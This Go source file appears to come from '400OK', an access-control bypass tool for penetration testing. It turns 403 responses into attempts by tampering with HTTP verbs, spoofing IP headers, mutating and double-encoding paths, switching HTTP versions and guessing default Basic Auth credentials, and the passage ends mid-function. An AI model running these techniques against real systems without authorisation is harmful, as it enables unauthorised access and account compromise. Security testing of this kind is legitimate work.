package cmd

import (
	"bufio"
	b64 "encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unicode"

	"github.com/fatih/color"
	"github.com/zenthangplus/goccm"
)

type Result struct {
	line          string
	statusCode    int
	contentLength int
	defaultReq    bool
}

type RequestOptions struct {
	uri           string
	headers       []header
	method        string
	proxy         *url.URL
	userAgent     string
	redirect      bool
	folder        string
	bypassIP      string
	timeout       int
	rateLimit     bool
	techniques    []string
	verbose       bool
	reqHeaders    []string
	banner        bool
	autocalibrate bool
}

var _verbose bool
var defaultCl int
var uniqueResults = make(map[string]bool)
var uniqueResultsByTechnique = make(map[string]map[string]bool)
var verbTamperingResults = make(map[string]int)
var shownResults = make(map[string]bool)

// Statistics tracking
var (
	totalCount    int64
	successCount  int64
	redirectCount int64
	errorCount    int64
	startTime     time.Time
	bypasses      []string
	bypassesMutex = &sync.Mutex{}
	jsonResults   []JSONResult
	jsonMutex     = &sync.Mutex{}
	interrupted   bool
)

var (
	printMutex               = &sync.Mutex{}
	uniqueResultsMutex       = &sync.Mutex{}
	uniqueResultsByTechMutex = &sync.Mutex{}
	shownResultsMutex        = &sync.Mutex{}
)

// JSONResult represents a single result for JSON output
type JSONResult struct {
	Timestamp     string `json:"timestamp"`
	Status        int    `json:"status"`
	Size          int    `json:"size"`
	Result        string `json:"result"`
	Payload       string `json:"payload"`
	Technique     string `json:"technique"`
	IsPotentialBypass bool `json:"is_potential_bypass"`
}

// JSONOutput represents the complete JSON output structure
type JSONOutput struct {
	Target    string       `json:"target"`
	StartTime string       `json:"start_time"`
	EndTime   string       `json:"end_time"`
	Results   []JSONResult `json:"results"`
	Summary   struct {
		Total      int64   `json:"total_requests"`
		Success    int64   `json:"successful_2xx"`
		Redirects  int64   `json:"redirects_3xx"`
		Errors     int64   `json:"errors_5xx"`
		Duration   string  `json:"duration"`
		SuccessRate float64 `json:"success_rate"`
		Bypasses   []string `json:"potential_bypasses"`
	} `json:"summary"`
}

// WaybackResponse represents the Wayback Machine API response
type WaybackResponse struct {
	ArchivedSnapshots struct {
		Closest struct {
			Available bool   `json:"available"`
			URL       string `json:"url"`
			Timestamp string `json:"timestamp"`
		} `json:"closest"`
	} `json:"archived_snapshots"`
}

// printResponse prints the results of HTTP requests in a tabular format with colored output based on the status codes.
func printResponse(result Result, technique string) {
	printMutex.Lock()
	defer printMutex.Unlock()

	// Track statistics
	atomic.AddInt64(&totalCount, 1)
	switch {
	case result.statusCode >= 200 && result.statusCode < 300:
		atomic.AddInt64(&successCount, 1)
	case result.statusCode >= 300 && result.statusCode < 400:
		atomic.AddInt64(&redirectCount, 1)
	case result.statusCode >= 500:
		atomic.AddInt64(&errorCount, 1)
	}

	// Generate a key to prevent duplicates
	key := fmt.Sprintf("%d-%d", result.statusCode, result.contentLength)

	// Check if this is a potential bypass (2xx response)
	isPotentialBypass := result.statusCode >= 200 && result.statusCode < 300 && result.contentLength != defaultCl

	// Add to JSON results if JSON output is enabled
	if len(jsonOutput) > 0 {
		jsonMutex.Lock()
		jsonResults = append(jsonResults, JSONResult{
			Timestamp:         time.Now().Format(time.RFC3339),
			Status:            result.statusCode,
			Size:              result.contentLength,
			Result:            result.line,
			Payload:           result.line,
			Technique:         technique,
			IsPotentialBypass: isPotentialBypass,
		})
		jsonMutex.Unlock()
	}

	// Track potential bypasses
	if isPotentialBypass {
		bypassesMutex.Lock()
		bypasses = append(bypasses, fmt.Sprintf("[%d] %s (%d bytes)", result.statusCode, result.line, result.contentLength))
		bypassesMutex.Unlock()
	}

	// If verbose mode is enabled, directly print the result
	if _verbose || technique == "http-versions" {
		printResult(result)
		return
	}

	// Check if the result has already been displayed
	shownResultsMutex.Lock()
	if shownResults[key] {
		shownResultsMutex.Unlock()
		return
	}
	shownResults[key] = true
	shownResultsMutex.Unlock()

	// Filter by specific status codes if filtering is enabled
	if len(statusCodes) > 0 {
		statusMatch := false
		for _, code := range statusCodes {
			if strconv.Itoa(result.statusCode) == code {
				statusMatch = true
				break
			}
		}
		if !statusMatch {
			return // Skip results that do not match the filtered status codes
		}
	}

	// Check for unique global output if uniqueOutput is enabled
	if uniqueOutput {
		globalKey := fmt.Sprintf("%d-%d-%s", result.statusCode, result.contentLength, result.line)

		uniqueResultsMutex.Lock()
		if uniqueResults[globalKey] {
			uniqueResultsMutex.Unlock()
			return
		}
		uniqueResults[globalKey] = true
		uniqueResultsMutex.Unlock()
	}

	// Additional deduplication by technique
	uniqueResultsByTechMutex.Lock()
	if _, exists := uniqueResultsByTechnique[technique]; !exists {
		uniqueResultsByTechnique[technique] = make(map[string]bool)
	}
	techniqueKey := fmt.Sprintf("%d-%s", result.contentLength, result.line)
	if uniqueResultsByTechnique[technique][techniqueKey] {
		uniqueResultsByTechMutex.Unlock()
		return
	}
	uniqueResultsByTechnique[technique][techniqueKey] = true
	uniqueResultsByTechMutex.Unlock()

	// Print the result after all filters are applied
	printResult(result)
}

// printResult prints the result of an HTTP request in a tabular format with colored output based on the status codes.
func printResult(result Result) {
	// Format the result
	resultContentLength := strconv.Itoa(result.contentLength) + " bytes"
	var code string

	// Assign colors to HTTP status codes based on their range
	switch result.statusCode {
	case 0:
		return
	case 200, 201, 202, 203, 204, 205, 206:
		code = color.GreenString(strconv.Itoa(result.statusCode))
	case 300, 301, 302, 303, 304, 307, 308:
		code = color.YellowString(strconv.Itoa(result.statusCode))
	case 400, 401, 402, 403, 404, 405, 406, 407, 408, 413, 429:
		code = color.RedString(strconv.Itoa(result.statusCode))
	case 500, 501, 502, 503, 504, 505, 511:
		code = color.MagentaString(strconv.Itoa(result.statusCode))
	default:
		code = strconv.Itoa(result.statusCode) // No color for other codes
	}

	// Print the result
	fmt.Printf("%s \t%20s %s\n", code, color.BlueString(resultContentLength), result.line)
}

// showInfo prints the configuration options used for the scan.
func showInfo(options RequestOptions) {
	var statusCodeStrings []string

	statusCodeStrings = append(statusCodeStrings, statusCodes...)
	statusCodesString := strings.Join(statusCodeStrings, ", ")

	if !nobanner {
		fmt.Print(color.MagentaString("━━━━━━━━━━━━━━━━━ 400OK CONFIGURATION ━━━━━━━━━━━━━━━━━━━\n"))
		fmt.Printf("%s \t\t%s\n", "Target:", options.uri)
		if len(options.reqHeaders) > 0 && len(options.reqHeaders[0]) != 0 {
			for _, header := range options.headers {
				fmt.Printf("%s \t\t%s\n", "Headers:", header)
			}
		} else {
			fmt.Printf("%s \t\t%s\n", "Headers:", "false")
		}
		if len(options.proxy.Host) != 0 {
			fmt.Printf("%s \t\t\t%s\n", "Proxy:", options.proxy.Host)
		} else {
			fmt.Printf("%s \t\t\t%s\n", "Proxy:", "false")
		}
		fmt.Printf("%s \t\t%s\n", "User Agent:", options.userAgent)
		fmt.Printf("%s \t\t%s\n", "Method:", options.method)
		fmt.Printf("%s \t%s\n", "Payloads folder:", options.folder)
		if len(bypassIP) != 0 {
			fmt.Printf("%s \t%s\n", "Custom bypass IP:", options.bypassIP)
		} else {
			fmt.Printf("%s \t%s\n", "Custom bypass IP:", "false")
		}
		fmt.Printf("%s \t%s\n", "Follow Redirects:", strconv.FormatBool(options.redirect))
		fmt.Printf("%s \t%s\n", "Rate Limit detection:", strconv.FormatBool(options.rateLimit))
		fmt.Printf("%s \t\t%s\n", "Status:", statusCodesString)
		fmt.Printf("%s \t\t%d\n", "Timeout (ms):", options.timeout)
		fmt.Printf("%s \t\t%d\n", "Delay (ms):", delay)
		fmt.Printf("%s \t\t%s\n", "Techniques:", strings.Join(options.techniques, ", "))
		fmt.Printf("%s \t\t%t\n", "Unique:", uniqueOutput)
		fmt.Printf("%s \t\t%t\n", "Verbose:", options.verbose)
	}
}

// generateCaseCombinations generates all combinations of uppercase and lowercase letters for a given string.
func generateCaseCombinations(s string) []string {
	if len(s) == 0 {
		return []string{""}
	}

	firstCharCombinations := []string{string(unicode.ToLower(rune(s[0]))), string(unicode.ToUpper(rune(s[0])))}
	subCombinations := generateCaseCombinations(s[1:])
	var combinations []string

	for _, char := range firstCharCombinations {
		for _, comb := range subCombinations {
			combinations = append(combinations, char+comb)
		}
	}

	return combinations
}

// filterOriginalMethod extract the original method from the list of combinations
func filterOriginalMethod(originalMethod string, combinations []string) []string {
	filtered := make([]string, 0, len(combinations))
	for _, combination := range combinations {
		if combination != originalMethod {
			filtered = append(filtered, combination)
		}
	}
	return filtered
}

// selectRandomCombinations selects up to n random combinations from a list of combinations.
func selectRandomCombinations(combinations []string, n int) []string {
	if len(combinations) <= n {
		return combinations
	}

	// Use crypto/rand seeded rand or time-based for shuffle
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	rng.Shuffle(len(combinations), func(i, j int) {
		combinations[i], combinations[j] = combinations[j], combinations[i]
	})

	return combinations[:n]
}

// requestDefault makes HTTP request to check the default response
func requestDefault(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━━━━ DEFAULT REQUEST ━━━━━━━━━━━━━━")

	var results []Result

	statusCode, response, err := request(options.method, options.uri, options.headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
	if err != nil {
		log.Println(err)
	}

	results = append(results, Result{options.method, statusCode, len(response), true})
	printResponse(Result{uri, statusCode, len(response), true}, "default")

	uniqueResultsMutex.Lock()
	for _, result := range results {
		defaultCl = result.contentLength
	}
	uniqueResultsMutex.Unlock()
}

// requestMethods makes HTTP requests using a list of methods from a file and prints the results.
func requestMethods(options RequestOptions) {
	color.Cyan("\n━━━���━━━━━━━━━━━ VERB TAMPERING ━━━━━━━━━━━━━━━")

	var lines []string
	lines, err := parseFile(options.folder + "/httpmethods")
	if err != nil {
		log.Fatalf("Error reading /httpmethods file: %v", err)
	}

	w := goccm.New(maxGoroutines)
	var verbTamperingResultsMutex = &sync.Mutex{}

	for _, line := range lines {
		time.Sleep(time.Duration(delay) * time.Millisecond)
		w.Wait()
		go func(line string) {
			defer w.Done()
			statusCode, response, err := request(line, options.uri, options.headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
			if err != nil {
				log.Println(err)
			}

			contentLength := len(response)

			if contentLength == defaultCl {
				return
			}

			verbTamperingResultsMutex.Lock()
			verbTamperingResults[line] = contentLength
			verbTamperingResultsMutex.Unlock()

			result := Result{
				line:          line,
				statusCode:    statusCode,
				contentLength: len(response),
				defaultReq:    false,
			}
			printResponse(result, "verb-tampering")
		}(line)
	}
	w.WaitAllDone()
}

// requestMethodsCaseSwitching makes HTTP requests using a list of methods from a file and prints the results.
func requestMethodsCaseSwitching(options RequestOptions) {
	color.Cyan("\n━━━━━━━ VERB TAMPERING CASE SWITCHING ━━━━━━━━")

	var lines []string
	lines, err := parseFile(options.folder + "/httpmethods")
	if err != nil {
		log.Fatalf("Error reading /httpmethods file: %v", err)
	}

	w := goccm.New(maxGoroutines)

	for _, line := range lines {
		methodCombinations := generateCaseCombinations(line)
		filteredCombinations := filterOriginalMethod(line, methodCombinations)
		selectedCombinations := selectRandomCombinations(filteredCombinations, 50)

		originalContentLength, exists := verbTamperingResults[line]
		if !exists {
			continue
		}

		for _, method := range selectedCombinations {
			time.Sleep(time.Duration(delay) * time.Millisecond)
			w.Wait()
			go func(method string) {
				defer w.Done()
				statusCode, response, err := request(method, options.uri, options.headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
				if err != nil {
					log.Println(err)
				}

				contentLength := len(response)

				if contentLength == originalContentLength || contentLength == defaultCl {
					return
				}

				result := Result{
					line:          method,
					statusCode:    statusCode,
					contentLength: len(response),
					defaultReq:    false,
				}

				printResponse(result, "verb-tampering-case")
			}(method)
		}
	}
	w.WaitAllDone()
}

// requestHeaders makes HTTP requests using a list of headers from a file and prints the results.
func requestHeaders(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━━━━━━━ HEADERS ━━━━━━━━━━━━━━━━━━━")

	// Load headers from file
	lines, err := parseFile(options.folder + "/headers")
	if err != nil {
		log.Fatalf("Error reading /headers file: %v", err)
	}

	// Load IPs for bypassing or use provided bypass IP
	var ips []string
	if len(options.bypassIP) != 0 {
		ips = []string{options.bypassIP}
	} else {
		ips, err = parseFile(options.folder + "/ips")
		if err != nil {
			log.Fatalf("Error reading /ips file: %v", err)
		}
	}

	// Load simple headers for additional testing
	simpleHeaders, err := parseFile(options.folder + "/simpleheaders")
	if err != nil {
		log.Fatalf("Error reading /simpleheaders file: %v", err)
	}

	// Remove duplicates from lines and ips
	lines = removeDuplicates(lines)
	ips = removeDuplicates(ips)

	w := goccm.New(maxGoroutines)

	// Generate unique combinations of headers and IPs
	uniqueCombined := make(map[string]bool)
	var combined []struct {
		Line string
		IP   string
	}

	for _, ip := range ips {
		for _, line := range lines {
			key := line + ":" + ip
			if !uniqueCombined[key] {
				uniqueCombined[key] = true
				combined = append(combined, struct {
					Line string
					IP   string
				}{Line: line, IP: ip})
			}
		}
	}

	// Process combined headers
	for _, item := range combined {
		time.Sleep(time.Duration(delay) * time.Millisecond)
		w.Wait()
		go func(item struct {
			Line string
			IP   string
		}) {
			defer w.Done()

			// Add headers to the request
			headers := append(options.headers, header{item.Line, item.IP})

			statusCode, response, err := request(options.method, options.uri, headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
			if err != nil {
				log.Println(err)
				return
			}

			result := Result{
				line:          item.Line + ": " + item.IP,
				statusCode:    statusCode,
				contentLength: len(response),
				defaultReq:    false,
			}
			printResponse(result, "headers")
		}(item)
	}

	// Process simple headers
	for _, simpleHeader := range simpleHeaders {
		time.Sleep(time.Duration(delay) * time.Millisecond)
		w.Wait()
		go func(line string) {
			defer w.Done()

			parts := strings.Split(line, " ")
			if len(parts) < 2 {
				log.Printf("Invalid simple header format: %s\n", line)
				return
			}
			headers := append(options.headers, header{parts[0], parts[1]})

			statusCode, response, err := request(options.method, options.uri, headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
			if err != nil {
				log.Println(err)
				return
			}

			result := Result{
				line:          line,
				statusCode:    statusCode,
				contentLength: len(response),
				defaultReq:    false,
			}
			printResponse(result, "headers")
		}(simpleHeader)
	}
	w.WaitAllDone()
}

// Helper function to remove duplicates from a slice
func removeDuplicates(input []string) []string {
	uniqueMap := make(map[string]bool)
	var result []string
	for _, item := range input {
		if _, exists := uniqueMap[item]; !exists {
			uniqueMap[item] = true
			result = append(result, item)
		}
	}
	return result
}

// requestEndPaths makes HTTP requests using a list of custom end paths from a file and prints the results.
func requestEndPaths(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━━━━ CUSTOM PATHS ━━━━━━━━━━━━━━━━━")

	var lines []string
	lines, err := parseFile(options.folder + "/endpaths")
	if err != nil {
		log.Fatalf("Error reading custom paths file: %v", err)
	}

	w := goccm.New(maxGoroutines)

	for _, line := range lines {
		time.Sleep(time.Duration(delay) * time.Millisecond)
		w.Wait()
		go func(line string) {
			defer w.Done()

			statusCode, response, err := request(options.method, joinURL(options.uri, line), options.headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
			if err != nil {
				log.Println(err)
			}

			contentLength := len(response)

			if contentLength == defaultCl {
				return
			}

			result := Result{
				line:          joinURL(options.uri, line),
				statusCode:    statusCode,
				contentLength: len(response),
				defaultReq:    false,
			}

			printResponse(result, "endpaths")
		}(line)
	}

	w.WaitAllDone()
}

// requestMidPaths makes HTTP requests using a list of custom mid-paths from a file and prints the results.
func requestMidPaths(options RequestOptions) {
	var lines []string
	lines, err := parseFile(options.folder + "/midpaths")
	if err != nil {
		log.Fatalf("Error reading custom paths file: %v", err)
	}
	x := strings.Split(options.uri, "/")
	var uripath string

	parsedURL, err := url.Parse(options.uri)
	if err != nil {
		log.Println(err)
	}
	if parsedURL.Path != "" && parsedURL.Path != "/" {
		if options.uri[len(options.uri)-1:] == "/" {
			uripath = x[len(x)-2]
		} else {
			uripath = x[len(x)-1]
		}

		baseuri := strings.ReplaceAll(options.uri, uripath, "")
		baseuri = baseuri[:len(baseuri)-1]

		w := goccm.New(maxGoroutines)

		for _, line := range lines {
			time.Sleep(time.Duration(delay) * time.Millisecond)
			w.Wait()
			go func(line string) {
				defer w.Done()

				var fullpath string
				if options.uri[len(options.uri)-1:] == "/" {
					fullpath = baseuri + line + uripath + "/"
				} else {
					fullpath = baseuri + "/" + line + uripath
				}

				statusCode, response, err := request(options.method, fullpath, options.headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
				if err != nil {
					log.Println(err)
				}

				contentLength := len(response)

				if contentLength == defaultCl {
					return
				}

				result := Result{
					line:          fullpath,
					statusCode:    statusCode,
					contentLength: len(response),
					defaultReq:    false,
				}
				printResponse(result, "midpaths")
			}(line)
		}
		w.WaitAllDone()
	}
}

// requestDoubleEncoding makes HTTP requests doing a double URL encode of the path
func requestDoubleEncoding(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━━━━ DOUBLE-ENCODING ━━━━━━━━━━━━━━")

	parsedURL, err := url.Parse(options.uri)
	if err != nil {
		log.Println(err)
		return
	}

	originalPath := parsedURL.Path
	if len(originalPath) == 0 || originalPath == "/" {
		log.Println("No path to modify")
		return
	}

	w := goccm.New(maxGoroutines)

	for i, c := range originalPath {
		if c == '/' {
			continue
		}

		// Single encode the character (e.g., 'A' -> '%41')
		singleEncoded := fmt.Sprintf("%%%02X", c)
		// Double encode it (e.g., '%41' -> '%2541')
		doubleEncoded := url.QueryEscape(singleEncoded)

		// Build the modified path by replacing the character at position i with the double-encoded version
		// Note: We need to handle rune positions correctly for multi-byte characters
		runeSlice := []rune(originalPath)
		modifiedPathStr := string(runeSlice[:i]) + doubleEncoded + string(runeSlice[i+1:])

		encodedUri := fmt.Sprintf("%s://%s%s", parsedURL.Scheme, parsedURL.Host, modifiedPathStr)

		time.Sleep(time.Duration(delay) * time.Millisecond)
		w.Wait()
		go func(encodedUri string, modifiedChar rune) {
			defer w.Done()

			statusCode, response, err := request(options.method, encodedUri, options.headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
			if err != nil {
				log.Println(err)
				return
			}

			result := Result{
				line:          encodedUri,
				statusCode:    statusCode,
				contentLength: len(response),
				defaultReq:    false,
			}
			printResponse(result, "double-encoding")
		}(encodedUri, c)
	}

	w.WaitAllDone()
}

// requestHttpVersions makes HTTP requests using a list of HTTP versions from a file and prints the results. If server responds with a unique version it is because is not accepting the version provided.
func requestHttpVersions(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━━━━ HTTP VERSIONS ━━━━━━━━━━━━━━━━")

	httpVersions := []string{"--http1.0"}

	for _, version := range httpVersions {
		res := curlRequest(options.uri, options.proxy.Host, version)
		printResponse(res, "http-versions")
	}

}

func curlRequest(url string, proxy string, httpVersion string) Result {
	args := []string{"-i", "-s", httpVersion}
	args = append(args, "-H", "User-Agent:")
	args = append(args, "-H", "Accept:")
	args = append(args, "-H", "Connection:")
	args = append(args, "-H", "Host:")
	if proxy != "" {
		args = append(args, "-x", proxy)
	}
	if redirect {
		args = append(args, "-L")
	}
	args = append(args, "--insecure")
	args = append(args, url)
	cmd := exec.Command("curl", args...)
	out, err := cmd.Output()
	if err != nil {
		log.Printf("Curl command failed: %v\n", err)
		return Result{}
	}

	return parseCurlOutput(string(out), httpVersion)
}

func parseCurlOutput(output string, httpVersion string) Result {
	httpVersionOutput := strings.ReplaceAll(httpVersion, "--http", "HTTP/")

	responses := strings.Split(output, "\r\n\r\n")

	var proxyResponse, serverResponse string

	for _, response := range responses {
		if strings.Contains(response, "Connection established") {
			proxyResponse = response
		} else if strings.HasPrefix(response, "HTTP/") {
			serverResponse = response
		}
	}

	if serverResponse == "" {
		log.Println("No valid HTTP server response found")
		return Result{}
	}

	totalResponseSize := len(output)

	if proxyResponse != "" {
		totalResponseSize -= len(proxyResponse) + len("\r\n\r\n")
	}

	lines := strings.SplitN(serverResponse, "\n", 2)
	if len(lines) < 1 {
		log.Println("Invalid server response format:", serverResponse)
		return Result{}
	}

	parts := strings.SplitN(lines[0], " ", 3)
	if len(parts) < 2 || !strings.HasPrefix(parts[0], "HTTP/") {
		log.Println("Invalid status line:", lines[0])
		return Result{}
	}

	statusCode, err := strconv.Atoi(parts[1])
	if err != nil {
		log.Printf("Error parsing status code: %v\n", err)
		return Result{}
	}

	return Result{
		line:          httpVersionOutput,
		statusCode:    statusCode,
		contentLength: totalResponseSize,
		defaultReq:    false,
	}
}

// requestPathCaseSwitching makes HTTP requests by capitalizing each letter in the last part of the URI and try to use URL encoded characters.
func requestPathCaseSwitching(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━ PATH CASE SWITCHING ━━━━━━━━━━━━━")

	parsedURL, err := url.Parse(options.uri)
	if err != nil {
		log.Println(err)
		return
	}

	baseuri := parsedURL.Scheme + "://" + parsedURL.Host
	uripath := strings.Trim(parsedURL.Path, "/")

	if len(uripath) == 0 {
		log.Println("No path to modify")
		return
	}

	pathCombinations := generateCaseCombinations(uripath)
	selectedPaths := selectRandomCombinations(pathCombinations, 20)
	w := goccm.New(maxGoroutines)

	for _, path := range selectedPaths {
		time.Sleep(time.Duration(delay) * time.Millisecond)
		w.Wait()
		go func(path string) {
			defer w.Done()

			var fullpath string
			if strings.HasSuffix(options.uri, "/") {
				fullpath = baseuri + "/" + path + "/"
			} else {
				fullpath = baseuri + "/" + path
			}

			statusCode, response, err := request(options.method, fullpath, options.headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
			if err != nil {
				log.Println(err)
			}

			result := Result{
				line:          fullpath,
				statusCode:    statusCode,
				contentLength: len(response),
				defaultReq:    false,
			}

			printResponse(result, "path-case-switching")
		}(path)
	}

	w.WaitAllDone()
}

// randomLine take a random line from a file
func randomLine(filePath string) (string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return "", err
	}
	defer func(file *os.File) {
		_ = file.Close()
	}(file)

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return "", err
	}

	// Use local RNG to avoid deprecated global Seed
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	randomLine := lines[rng.Intn(len(lines))]

	return randomLine, nil
}

// joinURL safely joins a base URL and a path, preserving slashes
func joinURL(base string, path string) string {
	if !strings.HasSuffix(base, "/") && !strings.HasPrefix(path, "/") {
		return base + "/" + path
	}
	if strings.HasSuffix(base, "/") && strings.HasPrefix(path, "/") {
		return base + path[1:]
	}
	return base + path
}

// setupRequestOptions configures and returns RequestOptions based on the provided parameters.
func setupRequestOptions(uri, proxy, userAgent string, reqHeaders []string, bypassIP, folder, method string, verbose bool, techniques []string, banner, rateLimit bool, timeout int, redirect, randomAgent bool) RequestOptions {
	// Set up proxy if provided.
	if len(proxy) != 0 {
		if !strings.Contains(proxy, "http") {
			proxy = "http://" + proxy
		}
	}
	userProxy, err := url.Parse(proxy)
	if err != nil {
		log.Fatalf("Error parsing proxy URL: %v", err)
	}

	// Check if URI has trailing slash, if not add it.
	x := strings.Split(uri, "/")
	if len(x) < 4 {
		uri += "/"
	}

	// Set User-Agent header.
	if !randomAgent {
		if len(userAgent) == 0 {
			userAgent = "400OK"
		}
	} else {
		line, err := randomLine(folder + "/useragents")
		if err != nil {
			fmt.Println("Error reading the file:", err)
			return RequestOptions{}
		}
		userAgent = line
	}

	// Set default request method to GET.
	if len(method) == 0 {
		method = "GET"
	}

	headers := []header{
		{"User-Agent", userAgent},
	}

	// Parse custom headers from CLI arguments and add them to the headers slice.
	if len(reqHeaders) > 0 && reqHeaders[0] != "" {
		for _, _header := range reqHeaders {
			headerSplit := strings.Split(_header, ":")
			headers = append(headers, header{headerSplit[0], strings.Join(headerSplit[1:], "")})
		}
	}

	return RequestOptions{
		uri:           uri,
		headers:       headers,
		method:        method,
		proxy:         userProxy,
		userAgent:     userAgent,
		redirect:      redirect,
		folder:        folder,
		bypassIP:      bypassIP,
		timeout:       timeout,
		rateLimit:     rateLimit,
		verbose:       verbose,
		techniques:    techniques,
		reqHeaders:    reqHeaders,
		banner:        banner,
		autocalibrate: !verbose,
	}
}

// resetMaps clears all result tracking maps before starting new requests.
func resetMaps() {
	shownResultsMutex.Lock()
	for k := range shownResults {
		delete(shownResults, k)
	}
	shownResultsMutex.Unlock()

	uniqueResultsMutex.Lock()
	for k := range uniqueResults {
		delete(uniqueResults, k)
	}
	uniqueResultsMutex.Unlock()

	uniqueResultsByTechMutex.Lock()
	for k := range uniqueResultsByTechnique {
		delete(uniqueResultsByTechnique, k)
	}
	uniqueResultsByTechMutex.Unlock()
}

// executeTechniques runs the selected bypass techniques based on the provided options.
func executeTechniques(options RequestOptions) {
	for _, tech := range options.techniques {
		if interrupted {
			return
		}
		switch tech {
		case "verbs":
			requestMethods(options)
		case "verbs-case":
			requestMethodsCaseSwitching(options)
		case "headers":
			requestHeaders(options)
		case "endpaths":
			requestEndPaths(options)
		case "midpaths":
			requestMidPaths(options)
		case "double-encoding":
			requestDoubleEncoding(options)
		case "http-versions":
			requestHttpVersions(options)
			requestHttpVersionsEnhanced(options) // Enhanced with all versions
		case "path-case":
			requestPathCaseSwitching(options)
		case "extensions":
			requestExtensions(options)
		case "default-creds":
			requestDefaultCreds(options)
		case "bugbounty-tips":
			requestBugBountyTips(options)
		// Monster exclusive techniques
		case "ipv6":
			requestIPv6Bypass(options)
		case "host-header":
			requestHostHeader(options)
		case "unicode":
			requestUnicodeBypass(options)
		case "waf-bypass":
			requestWAFBypass(options)
		case "wayback":
			requestWaybackCheck(options)
		case "via-header":
			requestViaHeader(options)
		case "forwarded":
			requestForwardedHeader(options)
		case "cache-control":
			requestCacheHeaders(options)
		case "accept-header":
			requestAcceptHeader(options)
		case "protocol":
			requestProtocolBypass(options)
		case "port":
			requestPortBypass(options)
		default:
			fmt.Printf("Unrecognized technique: %s\n", tech)
			fmt.Print("Available techniques: verbs, verbs-case, headers, endpaths, midpaths, double-encoding, http-versions, path-case, extensions, default-creds, bugbounty-tips, ipv6, host-header, unicode, waf-bypass, wayback, via-header, forwarded, cache-control, accept-header, protocol, port\n")
		}
	}
}

// requester is the main function that runs all the tests.
func requester(uri string, proxy string, userAgent string, reqHeaders []string, bypassIP string, folder string, method string, verbose bool, techniques []string, banner bool, rateLimit bool, timeout int, redirect bool, randomAgent bool) {
	_verbose = verbose

	options := setupRequestOptions(uri, proxy, userAgent, reqHeaders, bypassIP, folder, method, verbose, techniques, banner, rateLimit, timeout, redirect, randomAgent)

	// Reset all tracking data
	resetMaps()
	resetStatistics()

	// Setup graceful exit handler
	setupGracefulExit(options)

	if maxGoroutines > 100 {
		log.Printf("Warning: High number of goroutines (%d) may cause resource exhaustion.", maxGoroutines)
	}

	// Display configuration and perform auto-calibration
	showInfo(options)

	// Auto-calibrate
	if options.autocalibrate {
		defaultCl = runAutocalibrate(options)
	}

	requestDefault(options)
	executeTechniques(options)

	// Print summary and write JSON output
	if !interrupted {
		printSummary(options)
		writeJSONOutput(options)
	}
}

// requestExtensions tests for bypasses by appending file extensions to the target URL
func requestExtensions(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━━━━ EXTENSION TESTING ━━━━━━━━━━━━━━━")

	lines, err := parseFile(options.folder + "/extensions")
	if err != nil {
		log.Fatalf("Error reading extensions file: %v", err)
	}

	w := goccm.New(maxGoroutines)

	for _, line := range lines {
		time.Sleep(time.Duration(delay) * time.Millisecond)
		w.Wait()
		go func(line string) {
			defer w.Done()

			// Handle trailing slash - remove it before appending extension
			targetURL := options.uri
			if strings.HasSuffix(targetURL, "/") {
				targetURL = targetURL[:len(targetURL)-1]
			}
			modifiedURL := targetURL + line

			statusCode, response, err := request(options.method, modifiedURL, options.headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
			if err != nil {
				log.Println(err)
				return
			}

			contentLength := len(response)

			if contentLength == defaultCl {
				return
			}

			result := Result{
				line:          modifiedURL,
				statusCode:    statusCode,
				contentLength: len(response),
				defaultReq:    false,
			}
			printResponse(result, "extensions")
		}(line)
	}
	w.WaitAllDone()
}

// requestDefaultCreds tests for weak or default credentials using HTTP Basic Authentication
func requestDefaultCreds(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━ DEFAULT CREDENTIALS ━━━━━━━━━━━━━")

	lines, err := parseFile(options.folder + "/defaultcreds")
	if err != nil {
		log.Fatalf("Error reading defaultcreds file: %v", err)
	}

	w := goccm.New(maxGoroutines)

	for _, line := range lines {
		time.Sleep(time.Duration(delay) * time.Millisecond)
		w.Wait()
		go func(line string) {
			defer w.Done()

			// Base64 encode the credentials
			encodedCreds := b64.StdEncoding.EncodeToString([]byte(line))
			authHeader := header{key: "Authorization", value: "Basic " + encodedCreds}
			requestHeaders := append(options.headers, authHeader)

			statusCode, response, err := request(options.method, options.uri, requestHeaders, options.proxy, options.rateLimit, options.timeout, options.redirect)
			if err != nil {
				log.Println(err)
				return
			}

			contentLength := len(response)

			if contentLength == defaultCl {
				return
			}

			result := Result{
				line:          "Creds: " + line,
				statusCode:    statusCode,
				contentLength: len(response),
				defaultReq:    false,
			}
			printResponse(result, "default-creds")
		}(line)
	}
	w.WaitAllDone()
}

// requestBugBountyTips tests proven bypass techniques from bug bounty programs
func requestBugBountyTips(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━ BUG BOUNTY TECHNIQUES ━━━━━━━━━━━━━")

	lines, err := parseFile(options.folder + "/bugbountytips")
	if err != nil {
		log.Fatalf("Error reading bugbountytips file: %v", err)
	}

	// Parse URL to get base and path
	parsedURL, err := url.Parse(options.uri)
	if err != nil {
		log.Println(err)
		return
	}

	baseURL := parsedURL.Scheme + "://" + parsedURL.Host
	pathParts := strings.Split(strings.Trim(parsedURL.Path, "/"), "/")
	
